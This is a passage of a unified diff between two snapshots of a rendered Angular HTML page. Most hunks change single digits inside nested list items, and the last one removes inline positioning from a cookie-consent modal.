-                                                                                                                                    _ngcontent-c48="">3</span>
                                                                                                                             </p>
                                                                                                                         </li>
                                                                                                                         <li
@@ -39665,7 +39597,7 @@ ob_end_flush();
                                                                                                                             <p
                                                                                                                                 _ngcontent-c48="">
                                                                                                                                 <span
-                                                                                                                                    _ngcontent-c48="">7</span>
+                                                                                                                                    _ngcontent-c48="">3</span>
                                                                                                                             </p>
                                                                                                                         </li>
                                                                                                                         <li
@@ -39681,7 +39613,7 @@ ob_end_flush();
                                                                                                                             <p
                                                                                                                                 _ngcontent-c48="">
                                                                                                                                 <span
-                                                                                                                                    _ngcontent-c48="">4</span>
+                                                                                                                                    _ngcontent-c48="">5</span>
                                                                                                                             </p>
                                                                                                                         </li>
                                                                                                                         <li
@@ -39700,7 +39632,7 @@ ob_end_flush();
                                                                                                                             <p
                                                                                                                                 _ngcontent-c48="">
                                                                                                                                 <span
-                                                                                                                                    _ngcontent-c48="">9</span>
+                                                                                                                                    _ngcontent-c48="">4</span>
                                                                                                                             </p>
                                                                                                                         </li>
                                                                                                                         <li
@@ -39708,7 +39640,7 @@ ob_end_flush();
                                                                                                                             <p
                                                                                                                                 _ngcontent-c48="">
                                                                                                                                 <span
-                                                                                                                                    _ngcontent-c48="">3</span>
+                                                                                                                                    _ngcontent-c48="">7</span>
                                                                                                                             </p>
                                                                                                                         </li>
                                                                                                                         <li
@@ -39716,7 +39648,7 @@ ob_end_flush();
                                                                                                                             <p
                                                                                                                                 _ngcontent-c48="">
                                                                                                                                 <span
-                                                                                                                                    _ngcontent-c48="">6</span>
+                                                                                                                                    _ngcontent-c48="">0</span>
                                                                                                                             </p>
                                                                                                                         </li>
                                                                                                                         <li
@@ -39735,15 +39667,7 @@ ob_end_flush();
                                                                                                                             <p
                                                                                                                                 _ngcontent-c48="">
                                                                                                                                 <span
-                                                                                                                                    _ngcontent-c48="">0</span>
-                                                                                                                            </p>
-                                                                                                                        </li>
-                                                                                                                        <li
-                                                                                                                            _ngcontent-c48="">
-                                                                                                                            <p
-                                                                                                                                _ngcontent-c48="">
-                                                                                                                                <span
-                                                                                                                                    _ngcontent-c48="">5</span>
+                                                                                                                                    _ngcontent-c48="">9</span>
                                                                                                                             </p>
                                                                                                                         </li>
                                                                                                                         <li
@@ -39752,6 +39676,14 @@ ob_end_flush();
                                                                                                                                 _ngcontent-c48="">
                                                                                                                                 <span
                                                                                                                                     _ngcontent-c48="">2</span>
+                                                                                                                            </p>
+                                                                                                                        </li>
+                                                                                                                        <li
+                                                                                                                            _ngcontent-c48="">
+                                                                                                                            <p
+                                                                                                                                _ngcontent-c48="">
+                                                                                                                                <span
+                                                                                                                                    _ngcontent-c48="">8</span>
                                                                                                                             </p>
                                                                                                                         </li>
                                                                                                                         <li
@@ -39773,7 +39705,7 @@ ob_end_flush();
                                                                                                                             <p
                                                                                                                                 _ngcontent-c48="">
                                                                                                                                 <span
-                                                                                                                                    _ngcontent-c48="">8</span>
+                                                                                                                                    _ngcontent-c48="">6</span>
                                                                                                                             </p>
                                                                                                                         </li>
                                                                                                                         <li
@@ -40737,7 +40669,7 @@ ob_end_flush();
                                                                                                                             <p
                                                                                                                                 _ngcontent-c48="">
                                                                                                                                 <span
-                                                                                                                                    _ngcontent-c48="">2</span>
+                                                                                                                                    _ngcontent-c48="">0</span>
                                                                                                                             </p>
                                                                                                                         </li>
                                                                                                                         <li
@@ -40745,7 +40677,7 @@ ob_end_flush();
                                                                                                                             <p
                                                                                                                                 _ngcontent-c48="">
                                                                                                                                 <span
-                                                                                                                                    _ngcontent-c48="">7</span>
+                                                                                                                                    _ngcontent-c48="">4</span>
                                                                                                                             </p>
                                                                                                                         </li>
                                                                                                                         <li
@@ -40753,7 +40685,7 @@ ob_end_flush();
                                                                                                                             <p
                                                                                                                                 _ngcontent-c48="">
                                                                                                                                 <span
-                                                                                                                                    _ngcontent-c48="">3</span>
+                                                                                                                                    _ngcontent-c48="">9</span>
                                                                                                                             </p>
                                                                                                                         </li>
                                                                                                                         <li
@@ -40772,7 +40704,7 @@ ob_end_flush();
                                                                                                                             <p
                                                                                                                                 _ngcontent-c48="">
                                                                                                                                 <span
-                                                                                                                                    _ngcontent-c48="">9</span>
+                                                                                                                                    _ngcontent-c48="">3</span>
                                                                                                                             </p>
                                                                                                                         </li>
                                                                                                                         <li
@@ -40780,7 +40712,7 @@ ob_end_flush();
                                                                                                                             <p
                                                                                                                                 _ngcontent-c48="">
                                                                                                                                 <span
-                                                                                                                                    _ngcontent-c48="">4</span>
+                                                                                                                                    _ngcontent-c48="">7</span>
                                                                                                                             </p>
                                                                                                                         </li>
                                                                                                                         <li
@@ -40788,7 +40720,7 @@ ob_end_flush();
                                                                                                                             <p
                                                                                                                                 _ngcontent-c48="">
                                                                                                                                 <span
-                                                                                                                                    _ngcontent-c48="">8</span>
+                                                                                                                                    _ngcontent-c48="">2</span>
                                                                                                                             </p>
                                                                                                                         </li>
                                                                                                                         <li
@@ -40807,7 +40739,7 @@ ob_end_flush();
                                                                                                                             <p
                                                                                                                                 _ngcontent-c48="">
                                                                                                                                 <span
-                                                                                                                                    _ngcontent-c48="">5</span>
+                                                                                                                                    _ngcontent-c48="">6</span>
                                                                                                                             </p>
                                                                                                                         </li>
                                                                                                                         <li
@@ -40823,7 +40755,7 @@ ob_end_flush();
                                                                                                                             <p
                                                                                                                                 _ngcontent-c48="">
                                                                                                                                 <span
-                                                                                                                                    _ngcontent-c48="">6</span>
+                                                                                                                                    _ngcontent-c48="">8</span>
                                                                                                                             </p>
                                                                                                                         </li>
                                                                                                                         <li
@@ -40845,7 +40777,7 @@ ob_end_flush();
                                                                                                                             <p
                                                                                                                                 _ngcontent-c48="">
                                                                                                                                 <span
-                                                                                                                                    _ngcontent-c48="">0</span>
+                                                                                                                                    _ngcontent-c48="">5</span>
                                                                                                                             </p>
                                                                                                                         </li>
                                                                                                                         <li
@@ -41299,7 +41231,7 @@ ob_end_flush();
                 class="modalCookie" _nghost-c5=""><!---->
                 <div _ngcontent-c5="" class="custom-overlay" data-hidden="true" style="z-index: 899;"></div>
                 <div _ngcontent-c5="" class="parma limitedHeightMode big" data-hidden="true"
-                    style="opacity: 0; z-index: 900; left: 181px; top: 132.039px;">
+                    style="opacity: 0; z-index: 900;">
                     <div _ngcontent-c5="" class="parma-content-header">
                         <!---->
                         <!---->
